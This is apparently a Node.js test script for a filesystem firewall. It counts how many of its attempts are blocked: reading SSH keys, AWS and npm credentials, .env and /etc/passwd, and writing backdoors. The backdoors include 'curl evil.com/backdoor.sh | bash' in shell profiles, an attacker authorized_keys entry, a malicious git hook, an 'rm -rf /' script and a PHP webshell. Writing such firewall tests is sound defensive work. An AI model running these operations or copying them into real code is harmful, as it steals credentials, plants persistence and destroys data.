/**
 * MALICIOUS FILESYSTEM APP - FOR TESTING FIREWALL
 * Tests filesystem protection: blocked read/write paths and extensions
 */

const fs = require('fs');
const os = require('os');
const path = require('path');

console.log(' MALICIOUS FILESYSTEM APP - Testing Firewall Protection');
console.log('\n');

const results = {
  total: 0,
  blocked: 0,
  succeeded: 0
};

// Helper to test and track results
function testAttack(name, fn) {
  results.total++;
  console.log(`\n[ATTACK ${results.total}] ${name}`);
  try {
    fn();
    results.succeeded++;
    console.log(` SUCCESS - Attack succeeded (FIREWALL FAILED!)`);
    return true;
  } catch (e) {
    results.blocked++;
    console.log(` BLOCKED - ${e.message}`);
    return false;
  }
}

// === BLOCKED READ PATHS ===

testAttack('Reading SSH private key (~/.ssh/id_rsa)', () => {
  const sshPath = path.join(os.homedir(), '.ssh', 'id_rsa');
  const content = fs.readFileSync(sshPath, 'utf8');
  console.log(`   Read ${content.length} bytes of SSH key`);
});

testAttack('Reading AWS credentials (~/.aws/credentials)', () => {
  const awsPath = path.join(os.homedir(), '.aws', 'credentials');
  const content = fs.readFileSync(awsPath, 'utf8');
  console.log(`   Read ${content.length} bytes of AWS credentials`);
});

testAttack('Reading .env file (project root)', () => {
  const envPath = path.join(process.cwd(), '.env');
  const content = fs.readFileSync(envPath, 'utf8');
  console.log(`   Read ${content.length} bytes from .env`);
});

testAttack('Reading /etc/passwd', () => {
  const content = fs.readFileSync('/etc/passwd', 'utf8');
  console.log(`   Read ${content.length} bytes of system passwd file`);
});

testAttack('Reading ~/.npmrc (npm credentials)', () => {
  const npmrcPath = path.join(os.homedir(), '.npmrc');
  const content = fs.readFileSync(npmrcPath, 'utf8');
  console.log(`   Read ${content.length} bytes of npm config`);
});

testAttack('Reading ~/.gitconfig', () => {
  const gitconfigPath = path.join(os.homedir(), '.gitconfig');
  const content = fs.readFileSync(gitconfigPath, 'utf8');
  console.log(`   Read ${content.length} bytes of git config`);
});

testAttack('Reading shell history (~/.zsh_history)', () => {
  const historyPath = path.join(os.homedir(), '.zsh_history');
  const content = fs.readFileSync(historyPath, 'utf8');
  console.log(`   Read ${content.length} bytes of shell history`);
});

testAttack('Reading Docker config (~/.docker/config.json)', () => {
  const dockerPath = path.join(os.homedir(), '.docker', 'config.json');
  const content = fs.readFileSync(dockerPath, 'utf8');
  console.log(`   Read ${content.length} bytes of Docker config`);
});

// === BLOCKED WRITE PATHS ===

testAttack('Writing to /etc/evil.conf', () => {
  fs.writeFileSync('/etc/evil.conf', 'malicious content');
  console.log('   Wrote malicious config to /etc/');
});

testAttack('Writing to ~/.ssh/authorized_keys', () => {
  const sshPath = path.join(os.homedir(), '.ssh', 'authorized_keys');
  fs.appendFileSync(sshPath, '\nssh-rsa ATTACKER_KEY\n');
  console.log('   Added attacker SSH key');
});

testAttack('Writing to /usr/local/bin/malware', () => {
  fs.writeFileSync('/usr/local/bin/malware', '#!/bin/bash\necho "pwned"');
  console.log('   Installed malware in system bin');
});

testAttack('Modifying ~/.bashrc (persistence)', () => {
  const bashrcPath = path.join(os.homedir(), '.bashrc');
  fs.appendFileSync(bashrcPath, '\ncurl evil.com/backdoor.sh | bash\n');
  console.log('   Added backdoor to shell profile');
});

testAttack('Modifying ~/.zshrc (persistence)', () => {
  const zshrcPath = path.join(os.homedir(), '.zshrc');
  fs.appendFileSync(zshrcPath, '\ncurl evil.com/backdoor.sh | bash\n');
  console.log('   Added backdoor to zsh profile');
});

testAttack('Creating malicious GitHub workflow', () => {
  const workflowPath = path.join(process.cwd(), '.github', 'workflows', 'malicious.yml');
  fs.mkdirSync(path.dirname(workflowPath), { recursive: true });
  fs.writeFileSync(workflowPath, 'name: Exfiltrate\non: push\njobs:\n  steal:\n    runs-on: self-hosted');
  console.log('   Created malicious CI/CD workflow');
});

testAttack('Injecting Git hook (pre-commit)', () => {
  const hookPath = path.join(process.cwd(), '.git', 'hooks', 'pre-commit');
  fs.writeFileSync(hookPath, '#!/bin/bash\ncurl evil.com/steal-code.sh | bash\n');
  fs.chmodSync(hookPath, 0o755);
  console.log('   Injected malicious git hook');
});

// === BLOCKED EXTENSIONS ===

testAttack('Creating malicious shell script (.sh)', () => {
  const scriptPath = path.join('/tmp', 'backdoor.sh');
  fs.writeFileSync(scriptPath, '#!/bin/bash\nrm -rf /\n');
  console.log('   Created malicious .sh script');
});

testAttack('Creating Python backdoor (.py)', () => {
  const pyPath = path.join('/tmp', 'backdoor.py');
  fs.writeFileSync(pyPath, 'import os; os.system("curl evil.com/payload")');
  console.log('   Created malicious .py script');
});

testAttack('Creating Ruby backdoor (.rb)', () => {
  const rbPath = path.join('/tmp', 'backdoor.rb');
  fs.writeFileSync(rbPath, '`curl evil.com/payload`');
  console.log('   Created malicious .rb script');
});

testAttack('Creating Perl backdoor (.pl)', () => {
  const plPath = path.join('/tmp', 'backdoor.pl');
  fs.writeFileSync(plPath, 'system("curl evil.com/payload");');
  console.log('   Created malicious .pl script');
});

testAttack('Creating PHP webshell (.php)', () => {
  const phpPath = path.join('/tmp', 'webshell.php');
  fs.writeFileSync(phpPath, '<?php system($_GET["cmd"]); ?>');
  console.log('   Created PHP webshell');
});

// === ALLOWED PATHS (Should succeed) ===

testAttack('Writing to /tmp/ (should be ALLOWED)', () => {
  const tmpFile = path.join('/tmp', 'test-allowed.txt');
  fs.writeFileSync(tmpFile, 'This should be allowed');
  console.log('    Successfully wrote to /tmp/ (as expected)');
  fs.unlinkSync(tmpFile);
});

testAttack('Writing to node_modules/ (should be ALLOWED)', () => {
  const nmPath = path.join(process.cwd(), 'node_modules', 'test.txt');
  fs.mkdirSync(path.dirname(nmPath), { recursive: true });
  fs.writeFileSync(nmPath, 'This should be allowed');
  console.log('    Successfully wrote to node_modules/ (as expected)');
  fs.unlinkSync(nmPath);
});

// === SUMMARY ===

console.log('\n');
console.log('  TEST SUMMARY');
console.log('');
console.log(`Total Attacks: ${results.total}`);
console.log(`Blocked: ${results.blocked} `);
console.log(`Succeeded: ${results.succeeded} ${results.succeeded > 2 ? '  FIREWALL NEEDS FIXES' : '(only allowed paths)'}`);
console.log('\n');

process.exit(0);
